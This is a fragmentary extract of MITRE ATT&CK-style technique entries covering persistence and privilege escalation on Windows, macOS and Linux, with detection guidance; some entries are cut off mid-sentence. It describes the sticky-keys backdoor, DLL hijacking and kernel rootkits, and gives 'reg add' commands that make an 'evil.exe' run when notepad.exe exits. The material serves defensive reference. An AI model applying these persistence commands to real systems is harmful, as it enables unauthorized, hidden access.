      description: "<code>~/.bash_profile</code> and <code>~/.bashrc</code> are shell
        scripts that contain shell commands. These files are executed in a user's
        context when a new shell opens or when a user logs in so that their environment
        is set correctly. <code>~/.bash_profile</code> is executed for login shells
        and <code>~/.bashrc</code> is executed for interactive non-login shells. This
        means that when a user logs in (via username and password) to the console
        (either locally or remotely via something like SSH), the <code>~/.bash_profile</code>
        script is executed before the initial command prompt is returned to the user.
        After that, every time a new shell is opened, the <code>~/.bashrc</code> script
        is executed. This allows users more fine-grained control over when they want
        certain commands executed. These shell scripts are meant to be written to
        by the local user to configure their own environment. \n\nThe macOS Terminal.app
        is a little different in that it runs a login shell by default each time a
        new terminal window is opened, thus calling <code>~/.bash_profile</code> each
        time instead of <code>~/.bashrc</code>.\n\nAdversaries may abuse these shell
        scripts by inserting arbitrary shell commands that may be used to execute
        other binaries to gain persistence. Every time the user logs in or opens a
        new shell, the modified ~/.bash_profile and/or ~/.bashrc scripts will be executed.(Citation:

      name: Accessibility Features
      description: |-
        Windows contains accessibility features that may be launched with a key combination before a user has logged in (for example, when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.

        Two common accessibility programs are <code>C:\Windows\System32\sethc.exe</code>, launched when the shift key is pressed five times and <code>C:\Windows\System32\utilman.exe</code>, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as "sticky keys", and has been used by adversaries for unauthenticated access through a remote desktop login screen. (Citation: FireEye Hikit Rootkit)

        Depending on the version of Windows, an adversary may take advantage of these features in different ways because of code integrity enhancements. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in <code>%systemdir%\</code>, and it must be protected by Windows File or Resource Protection (WFP/WRP). (Citation: DEFCON2016 Sticky Keys) The debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced. Examples for both methods:

        For simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g., <code>C:\Windows\System32\utilman.exe</code>) may be replaced with "cmd.exe" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1076) will cause the replaced file to be executed with SYSTEM privileges. (Citation: Tilbury 2014)

        For the debugger method on Windows Vista and later as well as Windows Server 2008 and later, for example, a Registry key may be modified that configures "cmd.exe," or another program that provides backdoor access, as a "debugger" for the accessibility program (e.g., "utilman.exe"). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with RDP will cause the "debugger" program to be executed with SYSTEM privileges. (Citation: Tilbury 2014)

        Other accessibility features exist that may also be leveraged in a similar fashion: (Citation: DEFCON2016 Sticky Keys)

        * On-Screen Keyboard: <code>C:\Windows\System32\osk.exe</code>
        * Magnifier: <code>C:\Windows\System32\Magnify.exe</code>
        * Narrator: <code>C:\Windows\System32\Narrator.exe</code>
        * Display Switcher: <code>C:\Windows\System32\DisplaySwitch.exe</code>
        * App Switcher: <code>C:\Windows\System32\AtBroker.exe</code>

      name: Account Manipulation
      description: |-
        Account manipulation may aid adversaries in maintaining access to credentials and certain permission levels within an environment. Manipulation could consist of modifying permissions, modifying credentials, adding or changing permission groups, modifying account settings, or modifying how authentication is performed. These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to subvert password duration policies and preserve the life of compromised credentials. In order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain.

        ### Exchange Email Account Takeover

        The Add-MailboxPermission PowerShell cmdlet, available in on-premises Exchange and in the cloud-based service Office 365, adds permissions to a mailbox.(Citation: Microsoft - Add-MailboxPermission) This command can be run, given adequate permissions, to further access granted to certain user accounts. This may be used in persistent threat incidents as well as BEC (Business Email Compromise) incidents where an adversary can assign more access rights to the accounts they wish to compromise. This may further enable use of additional techniques for gaining access to systems. For example, compromised business accounts are often used to send messages to other accounts in the network of the target business while creating inbox rules so the messages evade spam/phishing detection mechanisms.(Citation: Bienstock, D. - Defending O365 - 2019)

        ### Azure AD

        In Azure, an adversary can set a second password for Service Principals, facilitating persistence.(Citation: Blue Cloud of Death)

        ### AWS

        AWS policies allow trust between accounts by simply identifying the account name. It is then up to the trusted account to only allow the correct roles to have access.(Citation: Summit Route Advanced AWS policy auditing)

Especially flag events where the subject and target accounts differ(Citation: InsiderThreat ChangeNTLM July 2017) or that include additional flags such as changing a password without knowledge of the old password.(Citation: GitHub Mimikatz Issue 92 June 2017)

        Use of credentials may also occur at unusual times or to unusual systems or services and may correlate with other suspicious activity.

        Monitor for unusual Exchange and Office 365 email account permissions changes that may indicate excessively broad permissions being granted to compromised accounts.

        A larger volume of emails sent from an account than normal and the discovery of similar phishing emails being sent from real accounts within a network may be signs that an account may have been compromised and attempts to leverage access with modified email permissions is occurring.

      name: Application Shimming
      description: "The Microsoft Windows Application Compatibility Infrastructure/Framework
        (Application Shim) was created to allow for backward compatibility of software
        as the operating system codebase changes over time. For example, the application
        shimming feature allows developers to apply fixes to applications (without
        rewriting code) that were created for Windows XP so that it will work with
        Windows 10. (Citation: Endgame Process Injection July 2017) Within the framework,
        shims are created to act as a buffer between the program (or more specifically,
        the Import Address Table) and the Windows OS. When a program is executed,
        the shim cache is referenced to determine if the program requires the use
        of the shim database (.sdb). If so, the shim database uses [Hooking](https://attack.mitre.org/techniques/T1179)
        to redirect the code as necessary in order to communicate with the OS. \n\nA
        list of all shims currently installed by the default Windows installer (sdbinst.exe)
        is kept in:\n\n* <code>%WINDIR%\\AppPatch\\sysmain.sdb</code>\n* <code>hklm\\software\\microsoft\\windows
        nt\\currentversion\\appcompatflags\\installedsdb</code>\n\nCustom databases
        are stored in:\n\n* <code>%WINDIR%\\AppPatch\\custom & %WINDIR%\\AppPatch\\AppPatch64\\Custom</code>\n*
        <code>hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\custom</code>\n\nTo
        keep shims secure, Windows designed them to run in user mode so they cannot
        modify the kernel and you must have administrator privileges to install a
        shim. However, certain shims can be used to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088)
        (UAC) (RedirectEXE), inject DLLs into processes (InjectDLL), disable Data
        Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH),
        and intercept memory addresses (GetProcAddress). Similar to [Hooking](https://attack.mitre.org/techniques/T1179),
        utilizing these shims may allow an adversary to perform several malicious
        acts such as elevate privileges, install backdoors, disable defenses like
        Windows Defender, etc."

        Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through Component Object Model (COM). (Citation: Microsoft COM) (Citation: Microsoft BITS) BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations.

        The interface to create and manage BITS jobs is accessible through [PowerShell](https://attack.mitre.org/techniques/T1086)  (Citation: Microsoft BITS) and the [BITSAdmin](https://attack.mitre.org/software/S0190) tool. (Citation: Microsoft BITSAdmin)

        Adversaries may abuse BITS to download, execute, and even clean up after running malicious code. BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls. (Citation: CTU BITS Malware June 2016) (Citation: Mondok Windows PiggyBack BITS May 2007) (Citation: Symantec BITS May 2007) BITS enabled execution may also allow Persistence by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots). (Citation: PaloAlto UBoatRAT Nov 2017) (Citation: CTU BITS Malware June 2016)

        BITS upload functionalities can also be used to perform [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048). (Citation: CTU BITS Malware June 2016)

        BITS runs as a service and its status can be checked with the Sc query utility (<code>sc query bits</code>). (Citation: Microsoft Issues with BITS July 2011) Active BITS tasks can be enumerated using the [BITSAdmin](https://attack.mitre.org/software/S0190) tool (<code>bitsadmin /list /allusers /verbose</code>). (Citation: Microsoft BITS)

        Monitor usage of the [BITSAdmin](https://attack.mitre.org/software/S0190) tool (especially the ‘Transfer’, 'Create', 'AddFile', 'SetNotifyFlags', 'SetNotifyCmdLine', 'SetMinRetryDelay', 'SetCustomHeaders', and 'Resume' command options)  (Citation: Microsoft BITS)Admin and the Windows Event log for BITS activity. Also consider investigating more detailed information about jobs by parsing the BITS job database. (Citation: CTU BITS Malware June 2016)

        Monitor and analyze network activity generated by BITS. BITS jobs use HTTP(S) and SMB for remote connections and are tethered to the creating user and will only function when that user is logged on (this rule applies even if a user attaches the job to a service account).

        A bootkit is a malware variant that modifies the boot sectors of a hard drive, including the Master Boot Record (MBR) and Volume Boot Record (VBR). (Citation: MTrends 2016)

        Adversaries may use bootkits to persist on systems at a layer below the operating system, which may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.

        ### Master Boot Record
        The MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code. (Citation: Lau 2011)

        ### Volume Boot Record
        The MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code.

        Browser extensions or plugins are small programs that can add functionality and customize aspects of internet browsers. They can be installed directly or through a browser's app store. Extensions generally have access and permissions to everything that the browser can access. (Citation: Wikipedia Browser Extension) (Citation: Chrome Extensions Definition)

        Malicious extensions can be installed into a browser through malicious app store downloads masquerading as legitimate extensions, through social engineering, or by an adversary that has already compromised a system. Security can be limited on browser app stores so may not be difficult for malicious extensions to defeat automated scanners and be uploaded. (Citation: Malicious Chrome Extension Numbers) Once the extension is installed, it can browse to websites in the background, (Citation: Chrome Extension Crypto Miner) (Citation: ICEBRG Chrome Extensions) steal all information that a user enters into a browser, to include credentials, (Citation: Banker Google Chrome Extension Steals Creds) (Citation: Catch All Chrome Extension) and be used as an installer for a RAT for persistence. There have been instances of botnets using a persistent backdoor through malicious Chrome extensions. (Citation: Stantinko Botnet) There have also been similar examples of extensions being used for command & control  (Citation: Chrome Extension C2 Malware).

        Inventory and monitor browser extension installations that deviate from normal, expected, and benign extensions. Process and network monitoring can be used to detect browsers communicating with a C2 server. However, this may prove to be a difficult way of initially detecting a malicious extension depending on the nature and volume of the traffic it generates.

        Monitor for any new items written to the Registry or PE files written to disk. That may correlate with browser extension installation.

      name: Change Default File Association
      description: |-
        When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access (Citation: Microsoft Change Default Programs) (Citation: Microsoft File Handlers) or by administrators using the built-in assoc utility. (Citation: Microsoft Assoc Oct 2017) Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened.

        System file associations are listed under <code>HKEY_CLASSES_ROOT\.[extension]</code>, for example <code>HKEY_CLASSES_ROOT\.txt</code>. The entries point to a handler for that extension located at <code>HKEY_CLASSES_ROOT\[handler]</code>. The various commands are then listed as subkeys underneath the shell key at <code>HKEY_CLASSES_ROOT\[handler]\shell\[action]\command</code>. For example:
        * <code>HKEY_CLASSES_ROOT\txtfile\shell\open\command</code>
        * <code>HKEY_CLASSES_ROOT\txtfile\shell\print\command</code>
        * <code>HKEY_CLASSES_ROOT\txtfile\shell\printto\command</code>

        The values of the keys listed are commands that are executed when the handler opens the file extension. Adversaries can modify these values to continually execute arbitrary commands. (Citation: TrendMicro TROJ-FAKEAV OCT 2012)

        to insert malicious code that can be executed in place of legitimate software
        through hijacking the COM references and relationships as a means for persistence.
        Hijacking a COM object requires a change in the Windows Registry to replace
        a reference to a legitimate system component which may cause that component
        to not work when executed. When that system component is executed through
        normal system operation the adversary''s code will be executed instead. (Citation:
        GDATA COM Hijacking) An adversary is likely to hijack objects that are used
        frequently enough to maintain a consistent level of persistence, but are unlikely
        to break noticeable functionality within the system as to avoid system instability
        that could lead to detection.'

        In cloud environments, adversaries may create accounts that only have access to specific services, which can reduce the chance of detection.

        ### Windows

        The <code>net user</code> commands can be used to create a local or domain account.

        ### Office 365

        An adversary with access to a Global Admin account can create another account and assign it the Global Admin role for persistent access to the Office 365 tenant.(Citation: Microsoft O365 Admin Roles)(Citation: Microsoft Support O365 Add Another Admin, October 2019)

      description: "Windows systems use a common method to look for required DLLs
        to load into a program. (Citation: Microsoft DLL Search) Adversaries may take
        advantage of the Windows DLL search order and programs that ambiguously specify
        DLLs to gain privilege escalation and persistence. \n\nAdversaries may perform
        DLL preloading, also called binary planting attacks, (Citation: OWASP Binary
        Planting) by placing a malicious DLL with the same name as an ambiguously
        specified DLL in a location that Windows searches before the legitimate DLL.
        Often this location is the current working directory of the program. Remote
        DLL preloading attacks occur when a program sets its current directory to
        a remote location such as a Web share before loading a DLL. (Citation: Microsoft
        2269637) Adversaries may use this behavior to cause the program to load a
        malicious DLL. \n\nAdversaries may also directly modify the way a program
        loads DLLs by replacing an existing DLL or modifying a .manifest or .local
        redirection file, directory, or junction to cause the program to load a different
        DLL to maintain persistence or privilege escalation. (Citation: Microsoft
        DLL Redirection) (Citation: Microsoft Manifests) (Citation: Mandiant Search
        Order)\n\nIf a search order-vulnerable program is configured to run at a higher
        privilege level, then the adversary-controlled DLL that is loaded will also
        be executed at the higher level. In this case, the technique could be used
        for privilege escalation from user to administrator or SYSTEM or from administrator
        to SYSTEM, depending on the program.\n\nPrograms that fall victim to path
        hijacking may appear to behave normally because malicious DLLs may be configured
        to also load the legitimate DLLs they were meant to replace."

        macOS and OS X use a common method to look for required dynamic libraries (dylib) to load into a program based on search paths. Adversaries can take advantage of ambiguous paths to plant dylibs to gain privilege escalation or persistence.

        A common method is to see what dylibs an application uses, then plant a malicious version with the same name higher up in the search path. This typically results in the dylib being in the same folder as the application itself. (Citation: Writing Bad Malware for OSX) (Citation: Malware Persistence on OS X)

        If the program is configured to run at a higher privilege level than the current user, then when the dylib is loaded into the application, the dylib will also run at that elevated level. This can be used by adversaries as a privilege escalation technique.

        Adversaries may use Event Monitor Daemon (emond) to establish persistence by scheduling malicious commands to run on predictable event triggers. Emond is a [Launch Daemon](https://attack.mitre.org/techniques/T1160) that accepts events from various services, runs them through a simple rules engine, and takes action. The emond binary at <code>/sbin/emond</code> will load any rules from the <code>/etc/emond.d/rules/</code> directory and take action once an explicitly defined event takes place. The rule files are in the plist format and define the name, event type, and action to take. Some examples of event types include system startup and user authentication. Examples of actions are to run a system command or send an email. The emond service will not launch if there is no file present in the QueueDirectories path <code>/private/var/db/emondClients</code>, specified in the [Launch Daemon](https://attack.mitre.org/techniques/T1160) configuration file at<code>/System/Library/LaunchDaemons/com.apple.emond.plist</code>.(Citation: xorrior emond Jan 2018)(Citation: magnusviri emond Apr 2016)(Citation: sentinelone macos persist Jun 2019)

        Adversaries may abuse this service by writing a rule to execute commands when a defined event occurs, such as system start up or user authentication.(Citation: xorrior emond Jan 2018)(Citation: magnusviri emond Apr 2016)(Citation: sentinelone macos persist Jun 2019) Adversaries may also be able to escalate privileges from administrator to root as the emond service is executed with root privileges by the [Launch Daemon](https://attack.mitre.org/techniques/T1160) service.

      name: File System Permissions Weakness
      description: |-
        Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.

        Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.

        ### Services

        Manipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.

        ### Executable Installers

        Another variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)

        Look for changes to binaries and service executables that may normally occur during software updates. If an executable is written, renamed, and/or moved to match an existing service executable, it could be detected and correlated with other suspicious behavior. Hashing of binaries and service executables could be used to detect replacement against historical data.

        Look for abnormal process call trees from typical processes and services and for execution of other commands that could relate to Discovery or other adversary techniques.

      name: Hidden Files and Directories
      description: |-
        To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a ‘hidden’ file. These files don’t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (<code>dir /a</code> for Windows and <code>ls –a</code> for Linux and macOS).

        Adversaries can use this to their advantage to hide files and folders anywhere on the system for persistence and evading a typical user or system analysis that does not incorporate investigation of hidden files.

        ### Windows

        Users can mark specific files as hidden by using the attrib.exe binary. Simply do <code>attrib +h filename</code> to mark a file or folder as hidden. Similarly, the “+s” marks a file as a system file and the “+r” flag marks the file as read only. Like most windows binaries, the attrib.exe binary provides the ability to apply these changes recursively “/S”.

        ### Linux/Mac

        Users can mark specific files as hidden simply by putting a “.” as the first character in the file or folder name  (Citation: Sofacy Komplex Trojan) (Citation: Antiquated Mac Malware). Files and folder that start with a period, ‘.’, are by default hidden from being viewed in the Finder application and standard command-line utilities like “ls”. Users must specifically change settings to have these files viewable. For command line usages, there is typically a flag to see all files (including hidden ones). To view these files in the Finder Application, the following command must be executed: <code>defaults write com.apple.finder AppleShowAllFiles YES</code>, and then relaunch the Finder Application.

        ### Mac

        Files on macOS can be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app (Citation: WireLurker).
        Many applications create these hidden files and folders to store information so that it doesn’t clutter up the user’s workspace. For example, SSH utilities create a .ssh folder that’s hidden and contains the user’s known hosts and keys.

      description: "Windows processes often leverage application programming interface
        (API) functions to perform tasks that require reusable system resources. Windows
        API functions are typically stored in dynamic-link libraries (DLLs) as exported
        functions. \n\nHooking involves redirecting calls to these functions and can
        be implemented via:\n\n* **Hooks procedures**, which intercept and execute
        designated code in response to events such as messages, keystrokes, and mouse
        inputs. (Citation: Microsoft Hook Overview) (Citation: Endgame Process Injection
        July 2017)\n* **Import address table (IAT) hooking**, which use modifications
        to a process’s IAT, where pointers to imported API functions are stored. (Citation:
        Endgame Process Injection July 2017) (Citation: Adlice Software IAT Hooks
        Oct 2014) (Citation: MWRInfoSecurity Dynamic Hooking 2015)\n* **Inline hooking**,
        which overwrites the first bytes in an API function to redirect code flow.
        (Citation: Endgame Process Injection July 2017) (Citation: HighTech Bridge
        Inline Hooking Sept 2011) (Citation: MWRInfoSecurity Dynamic Hooking 2015)\n\nSimilar
        to [Process Injection](https://attack.mitre.org/techniques/T1055), adversaries
        may use hooking to load and execute malicious code within the context of another
        process, masking the execution while also allowing access to the process's
        memory and possibly elevated privileges. Installing hooking mechanisms may
        also provide Persistence via continuous invocation when the functions are
        called through normal use.\n\nMalicious hooking mechanisms may also capture
        API calls that include parameters that reveal user authentication credentials
        for Credential Access. (Citation: Microsoft TrojanSpy:Win32/Ursnif.gen!I Sept
        2017)\n\nHooking is commonly utilized by [Rootkit](https://attack.mitre.org/techniques/T1014)s
        to conceal files, processes, Registry keys, and other objects in order to
        hide malware and associated behaviors. (Citation: Symantec Windows Rootkits)"

        Monitor for calls to the SetWindowsHookEx and SetWinEventHook functions, which install a hook procedure. (Citation: Microsoft Hook Overview) (Citation: Volatility Detecting Hooks Sept 2012) Also consider analyzing hook chains (which hold pointers to hook procedures for each type of hook) using tools  (Citation: Volatility Detecting Hooks Sept 2012) (Citation: PreKageo Winhook Jul 2011) (Citation: Jay GetHooks Sept 2011) or by programmatically examining internal kernel structures. (Citation: Zairon Hooking Dec 2006) (Citation: EyeofRa Detecting Hooking June 2017)

        Rootkits detectors  (Citation: GMER Rootkits) can also be used to monitor for various flavors of hooking activity.

        Verify integrity of live processes by comparing code in memory to that of corresponding static binaries, specifically checking for jumps and other instructions that redirect code flow. Also consider taking snapshots of newly started processes  (Citation: Microsoft Process Snapshot) to compare the in-memory IAT to the real addresses of the referenced functions. (Citation: StackExchange Hooks Jul 2012) (Citation: Adlice Software IAT Hooks Oct 2014)

      name: Image File Execution Options Injection
      description: |-
        Image File Execution Options (IFEO) enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application’s IFEO will be prepended to the application’s name, effectively launching the new process under the debugger (e.g., “C:\dbg\ntsd.exe -g  notepad.exe”). (Citation: Microsoft Dev Blog IFEO Mar 2010)

        IFEOs can be set directly via the Registry or in Global Flags via the GFlags tool. (Citation: Microsoft GFlags Mar 2017) IFEOs are represented as <code>Debugger</code> values in the Registry under <code>HKLM\SOFTWARE{\Wow6432Node}\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<executable></code> where <code><executable></code> is the binary on which the debugger is attached. (Citation: Microsoft Dev Blog IFEO Mar 2010)

        IFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process). (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018) Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IEFO and silent process exit Registry values in <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\</code>. (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018)

        An example where the evil.exe process is started when notepad.exe exits: (Citation: Oddvar Moe IFEO APR 2018)

        * <code>reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512</code>
        * <code>reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1</code>
        * <code>reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "C:\temp\evil.exe"</code>

        Similar to [Process Injection](https://attack.mitre.org/techniques/T1055), these values may be abused to obtain persistence and privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer. (Citation: Endgame Process Injection July 2017) Installing IFEO mechanisms may also provide Persistence via continuous invocation.

        Malware may also use IFEO for Defense Evasion by registering invalid debuggers that redirect and effectively disable various system and security applications. (Citation: FSecure Hupigon) (Citation: Symantec Ushedix June 2008)

      name: Kernel Modules and Extensions
      description: |-
        Loadable Kernel Modules (or LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system. (Citation: Linux Kernel Programming) When used maliciously, Loadable Kernel Modules (LKMs) can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0). (Citation: Linux Kernel Module Programming Guide) Adversaries can use loadable kernel modules to covertly persist on a system and evade defenses. Examples have been found in the wild and there are some open source projects. (Citation: Volatility Phalanx2) (Citation: CrowdStrike Linux Rootkit) (Citation: GitHub Reptile) (Citation: GitHub Diamorphine)

        Common features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors and enabling root access to non-privileged users. (Citation: iDefense Rootkit Overview)

        Kernel extensions, also called kext, are used for macOS to load functionality onto a system similar to LKMs for Linux. They are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Several examples have been found where this can be used. (Citation: RSAC 2015 San Francisco Patrick Wardle) (Citation: Synack Secure Kernel Extension Broken) Examples have been found in the wild. (Citation: Securelist Ventir)

        LKMs are typically loaded into <code>/lib/modules</code> and have had the extension .ko ("kernel object") since version 2.6 of the Linux kernel. (Citation: Wikipedia Loadable Kernel Module)

        Many LKMs require Linux headers (specific to the target kernel) in order to compile properly. 
        These are typically obtained through the operating systems package manager and installed like a normal package.

        Adversaries will likely run these commands on the target system before loading a malicious module in order to ensure that it is properly compiled. (Citation: iDefense Rootkit Overview)

        On Ubuntu and Debian based systems this can be accomplished by running: <code>apt-get install linux-headers-$(uname -r)</code>

        On RHEL and CentOS based systems this can be accomplished by running: <code>yum install kernel-devel-$(uname -r)</code>

        Loading, unloading, and manipulating modules on Linux systems can be detected by monitoring for the following commands:<code>modprobe insmod lsmod rmmod modinfo</code> (Citation: Linux Loadable Kernel Module Insert and Remove LKMs)

        For macOS, monitor for execution of <code>kextload</code> commands and correlate with other unknown or suspicious activity.

        The Windows security subsystem is a set of components that manage and enforce the security policy for a computer or domain. The Local Security Authority (LSA) is the main component responsible for local security policy and user authentication. The LSA includes multiple dynamic link libraries (DLLs) associated with various other security functions, all of which run in the context of the LSA Subsystem Service (LSASS) lsass.exe process. (Citation: Microsoft Security Subsystem)

        Adversaries may target lsass.exe drivers to obtain execution and/or persistence. By either replacing or adding illegitimate drivers (e.g., [DLL Side-Loading](https://attack.mitre.org/techniques/T1073) or [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038)), an adversary can achieve arbitrary code execution triggered by continuous LSA operations.

      description: |-
        On Linux and macOS systems, multiple methods are supported for creating pre-scheduled and periodic background jobs: cron, (Citation: Die.net Linux crontab Man Page) at, (Citation: Die.net Linux at Man Page) and launchd. (Citation: AppleDocs Scheduling Timed Jobs) Unlike [Scheduled Task](https://attack.mitre.org/techniques/T1053) on Windows systems, job scheduling on Linux-based systems cannot be done remotely unless used in conjunction within an established remote session, like secure shell (SSH).

        ### cron

        System-wide cron jobs are installed by modifying <code>/etc/crontab</code> file, <code>/etc/cron.d/</code> directory or other locations supported by the Cron daemon, while per-user cron jobs are installed using crontab with specifically formatted crontab files. (Citation: AppleDocs Scheduling Timed Jobs) This works on macOS and Linux systems.

        Those methods allow for commands or scripts to be executed at specific, periodic intervals in the background without user interaction. An adversary may use job scheduling to execute programs at system startup or on a scheduled basis for Persistence, (Citation: Janicab) (Citation: Methods of Mac Malware Persistence) (Citation: Malware Persistence on OS X) (Citation: Avast Linux Trojan Cron Persistence) to conduct Execution as part of Lateral Movement, to gain root privileges, or to run a process under the context of a specific account.

        ### at

        The at program is another means on POSIX-based systems, including macOS and Linux, to schedule a program or script job for execution at a later date and/or time, which could also be used for the same purposes.

        ### launchd

        Each launchd job is described by a different configuration property list (plist) file similar to [Launch Daemon](https://attack.mitre.org/techniques/T1160) or [Launch Agent](https://attack.mitre.org/techniques/T1159), except there is an additional key called <code>StartCalendarInterval</code> with a dictionary of time values. (Citation: AppleDocs Scheduling Timed Jobs) This only works on macOS and OS X.

      description: |-
        ### Windows

        Windows allows logon scripts to be run whenever a specific user or group of users log into a system. (Citation: TechNet Logon Scripts) The scripts can be used to perform administrative functions, which may often execute other programs or send information to an internal logging server.

        If adversaries can access these scripts, they may insert additional code into the logon script to execute their tools when a user logs in. This code can allow them to maintain persistence on a single system, if it is a local script, or to move laterally within a network, if the script is stored on a central server and pushed to many systems. Depending on the access configuration of the logon scripts, either local credentials or an administrator account may be necessary.

        ### Mac

        Mac allows login and logoff hooks to be run as root whenever a specific user logs into or out of a system. A login hook tells Mac OS X to execute a certain script when a user logs in, but unlike startup items, a login hook executes as root (Citation: creating login hook). There can only be one login hook at a time though. If adversaries can access these scripts, they can insert additional code to the script to execute their tools when a user logs in.

        Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Registry. Service configurations can be modified using utilities such as sc.exe and [Reg](https://attack.mitre.org/software/S0075).

        Adversaries can modify an existing service to persist malware on a system by using system utilities or by using custom tools to interact with the Windows API. Use of existing services is a type of [Masquerading](https://attack.mitre.org/techniques/T1036) that may make detection analysis more challenging. Modifying existing services may interrupt their functionality or may enable services that are disabled or otherwise not commonly used.

        Adversaries may also intentionally corrupt or kill services to execute malicious recovery programs/commands. (Citation: Twitter Service Recovery Nov 2017) (Citation: Microsoft Service Recovery Feb 2013)

        operating systems within an enterprise network. There are multiple mechanisms
        that can be used with Office for persistence when an Office-based application
        is started.\n\n### Office Template Macros\n\nMicrosoft Office contains templates
        that are part of common Office applications and are used to customize styles.
        The base templates within the application are used each time an application
        starts. (Citation: Microsoft Change Normal Template)\n\nOffice Visual Basic
        for Applications (VBA) macros (Citation: MSDN VBA in Office) can be inserted
        into the base template and used to execute code when the respective Office
        application starts in order to obtain persistence. Examples for both Word
        and Excel have been discovered and published. By default, Word has a Normal.dotm
        template created that can be modified to include a malicious macro. Excel
        does not have a template file created by default, but one can be added that
        will automatically be loaded.(Citation: enigma0x3 normal.dotm)(Citation: Hexacorn
        Office Template Macros) Shared templates may also be stored and pulled from
        remote locations.(Citation: GlobalDotName Jun 2019) \n\nWord Normal.dotm location:<code>C:\\Users\\\\(username)\\AppData\\Roaming\\Microsoft\\Templates\\Normal.dotm</code>\n\nExcel
        Personal.xlsb location:<code>C:\\Users\\\\(username)\\AppData\\Roaming\\Microsoft\\Excel\\XLSTART\\PERSONAL.XLSB</code>\n\nAdversaries
        may also change the location of the base template to point to their own by
        hijacking the application's search order, e.g. Word 2016 will first look for
        Normal.dotm under <code>C:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\</code>,
        or by modifying the GlobalDotName registry key. By modifying the GlobalDotName
